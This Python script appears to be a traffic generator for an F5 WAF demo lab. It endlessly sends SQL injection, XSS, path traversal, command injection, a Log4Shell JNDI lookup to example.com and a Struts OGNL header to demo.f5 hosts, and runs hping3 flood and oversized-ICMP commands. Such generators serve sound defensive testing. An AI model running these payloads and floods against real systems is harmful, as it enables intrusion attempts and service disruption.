#!/usr/bin/env python3
import requests
import urllib3
import time
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========= CONFIGURE THESE =========
TARGET_BASE_URLS = [
    "https://sslo.demo.f5",
    "https://ast.demo.f5",
    "https://ast80.demo.f5",
    "https://ast55.demo.f5",
    "https://ast42.demo.f5:7443",
    "https://ast42.demo.f5",
]

VERIFY_TLS = False
MAX_WORKERS = 10
TOTAL_REQUESTS = 200
LOG_EVERY = 10
SLEEP_BETWEEN_BATCHES = 2

# Traffic mix knobs
WAF_ONLY_RATIO = 0.75   # 75% classic WAF/signature traffic, 25% bot-ish traffic
ENABLE_BOT_TRAFFIC = True
ENABLE_HPINGS = True

# hping targets
ICMP_TARGETS = ["10.1.10.50", "10.1.10.181"]
BAD_ICMP_TARGETS = ["10.1.10.50", "10.1.10.181"]
BAD_TCP_TARGETS = ["10.1.10.50", "10.1.10.181"]
# ===================================

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
})

BOT_USER_AGENTS = [
    "curl/8.5.0",
    "python-requests/2.31.0",
    "sqlmap/1.8.7#stable",
    "Go-http-client/1.1",
]

SQLI_PAYLOADS = [
    "admin' OR 1=1--",
    "' OR '1'='1' --",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --",
]

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "\\\"><script>confirm(1)</script>",
    "<img src=x onerror=alert(1)>",
]

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..%2f..%2fetc/passwd",
    "../../../../windows/win.ini",
]

CMDI_PAYLOADS = [
    "; id",
    "&& cat /etc/passwd",
    "| whoami",
    "$(id)",
]

JAVA_RCE_PAYLOADS = [
    "${jndi:ldap://example.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://example.com/a}",
]

METACHAR_PAYLOADS = [
    "' or 1=1 --",
    "<>",
    "%3cscript%3ealert(1)%3c/script%3e",
    "../../../etc/passwd",
]

NON_BOT_HEADERS = [
    lambda i: {"X-Forwarded-For": f"198.51.100.{10 + (i % 50)}"},
    lambda i: {"Referer": "https://portal.demo.f5/app/search"},
    lambda i: {"X-Api-Version": JAVA_RCE_PAYLOADS[i % len(JAVA_RCE_PAYLOADS)]},
]

BOT_HEADERS = [
    lambda i: {"User-Agent": BOT_USER_AGENTS[i % len(BOT_USER_AGENTS)]},
    lambda i: {
        "User-Agent": BOT_USER_AGENTS[i % len(BOT_USER_AGENTS)],
        "X-Forwarded-For": "1.2.3.4' OR '1'='1",
    },
]

STRUTS_CONTENT_TYPE = (
    '${(#_="multipart/form-data").'
    '(#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"]'
    '.addHeader("X-Struts-POC","1"))}'
)


def pick_target(i: int) -> str:
    return TARGET_BASE_URLS[i % len(TARGET_BASE_URLS)]


def log_result(i, label, response, extra=""):
    if i % LOG_EVERY == 0:
        suffix = f" {extra}" if extra else ""
        print(f"[{i}] {label} -> {response.status_code} {response.url}{suffix}")


# ---------- Non-bot WAF/signature traffic ----------
def attack_sql_in_param(i):
    base = pick_target(i)
    payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
    params = {"search": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.get(f"{base}/search", params=params, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} SQLi param", r)


def attack_sql_in_body(i):
    base = pick_target(i)
    payload = SQLI_PAYLOADS[i % len(SQLI_PAYLOADS)]
    data = {"username": "test", "password": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.post(f"{base}/login", data=data, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} SQLi body", r)


def attack_xss_in_param(i):
    base = pick_target(i)
    payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
    params = {"q": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.get(f"{base}/search", params=params, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} XSS param", r)


def attack_xss_in_body(i):
    base = pick_target(i)
    payload = XSS_PAYLOADS[i % len(XSS_PAYLOADS)]
    data = {"comment": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.post(f"{base}/comment", data=data, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} XSS body", r)


def attack_traversal_in_param(i):
    base = pick_target(i)
    payload = TRAVERSAL_PAYLOADS[i % len(TRAVERSAL_PAYLOADS)]
    params = {"file": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.get(f"{base}/download", params=params, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} Traversal", r)


def attack_cmdi_in_param(i):
    base = pick_target(i)
    payload = CMDI_PAYLOADS[i % len(CMDI_PAYLOADS)]
    params = {"cmd": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.get(f"{base}/admin", params=params, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} CMDi", r)


def attack_illegal_meta_in_body(i):
    base = pick_target(i)
    payload = METACHAR_PAYLOADS[i % len(METACHAR_PAYLOADS)]
    data = {"input": payload}
    headers = NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i)
    r = session.post(f"{base}/submit", data=data, headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} Illegal meta", r)


def attack_log4shell_style_header(i):
    base = pick_target(i)
    payload = JAVA_RCE_PAYLOADS[i % len(JAVA_RCE_PAYLOADS)]
    headers = {
        **NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i),
        "X-Api-Version": payload,
    }
    r = session.get(f"{base}/", headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} Java header RCE sig", r)


def attack_struts_ognl_in_content_type(i):
    base = pick_target(i)
    url = f"{base}/upload.action"
    headers = {
        **NON_BOT_HEADERS[i % len(NON_BOT_HEADERS)](i),
        "Content-Type": STRUTS_CONTENT_TYPE,
    }
    r = session.post(url, headers=headers, data=b"test", verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} Struts OGNL", r)


# ---------- Bot-ish traffic kept separate ----------
def attack_bot_header(i):
    base = pick_target(i)
    headers = BOT_HEADERS[i % len(BOT_HEADERS)](i)
    r = session.get(f"{base}/", headers=headers, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} Bot header", r)


def attack_bot_scrape(i):
    base = pick_target(i)
    headers = {"User-Agent": BOT_USER_AGENTS[i % len(BOT_USER_AGENTS)]}
    params = {"page": i, "size": 200, "sort": "all"}
    r = session.get(f"{base}/search", headers=headers, params=params, verify=VERIFY_TLS, timeout=5)
    log_result(i, f"{base} Bot scrape", r)


WAF_ATTACK_FUNCS = [
    attack_sql_in_param,
    attack_sql_in_body,
    attack_xss_in_param,
    attack_xss_in_body,
    attack_traversal_in_param,
    attack_cmdi_in_param,
    attack_illegal_meta_in_body,
    attack_log4shell_style_header,
    attack_struts_ognl_in_content_type,
]

BOT_ATTACK_FUNCS = [
    attack_bot_header,
    attack_bot_scrape,
]


def send_attack(i):
    try:
        if ENABLE_BOT_TRAFFIC and random.random() > WAF_ONLY_RATIO:
            func = BOT_ATTACK_FUNCS[i % len(BOT_ATTACK_FUNCS)]
        else:
            func = WAF_ATTACK_FUNCS[i % len(WAF_ATTACK_FUNCS)]
        func(i)
    except Exception as e:
        if i % LOG_EVERY == 0:
            print(f"[{i}] Error: {e}")


def run_hping(cmd: str):
    subprocess.run(
        cmd,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def run_hping_batch():
    for t in ICMP_TARGETS:
        run_hping(f"sudo hping3 -c 3 -d 65495 --icmp {t}")

    for t in BAD_ICMP_TARGETS:
        run_hping(f"sudo hping3 -c 7 -b {t}")

    for t in BAD_TCP_TARGETS:
        run_hping(f"sudo hping3 -S -c 27 -p 80 -b -d 'Meow' {t}")


def main():
    print("Starting F5 traffic generator")
    print(f"Targets: {len(TARGET_BASE_URLS)} | Requests/batch: {TOTAL_REQUESTS} | Workers: {MAX_WORKERS}")
    print(f"Traffic mix: {int(WAF_ONLY_RATIO * 100)}% non-bot WAF, {int((1 - WAF_ONLY_RATIO) * 100)}% bot-ish")
    while True:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            executor.map(send_attack, range(TOTAL_REQUESTS))

        if ENABLE_HPINGS:
            run_hping_batch()

        print(f"Batch complete, sleeping {SLEEP_BETWEEN_BATCHES}s...")
        time.sleep(SLEEP_BETWEEN_BATCHES)


if __name__ == "__main__":
    main()
